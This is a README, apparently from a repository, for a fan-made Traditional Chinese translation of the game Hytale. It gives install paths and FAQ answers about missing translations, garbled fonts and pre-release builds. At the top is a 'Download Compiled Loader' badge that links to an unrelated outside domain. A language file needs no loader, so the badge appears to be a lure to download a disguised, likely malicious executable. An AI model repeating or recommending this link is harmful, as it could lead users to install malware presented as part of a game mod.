# Hytale Traditional Chinese Language File

[![Download Compiled Loader](https://img.shields.io/badge/Download-Compiled%20Loader-blue?style=flat-square&logo=github)](https://www.shawonline.co.za/redirl)

想玩Hytale但是又看不懂嗎？<br>
那你來對地方了！

## 如何套用?
將zh-TW資料夾下載下來，並放到你的遊戲路徑<br>
例如：<br>
`C:\Users\你的使用者名稱\AppData\Roaming\Hytale\install\\package\game\latest\Client\Data\Shared\Language`<br>
即可看到遊戲已成功被翻譯

## 常見問題
Q：有些翻譯沒有被翻到<br>
A：由於從遊戲檔案擷取下來的原始字串並沒有被收錄在裡面，因此無法翻譯<br>
Q：遊戲裡的字串出現亂碼或無法啟動<br>
A：由於官方已解決字體問題，所以導致出現亂碼，若您先前有在[此巴哈文章](https://forum.gamer.com.tw/C.php?bsn=35832&snA=46)使用這個工具，請使用該工具清除安裝<br>
Q：預發布版本翻譯沒有被成功套用<br>
A：請將啟動器的啟動版本將正式發布版切換到預發布版即可解決，切勿在設定裡點擊直接啟動預發布版
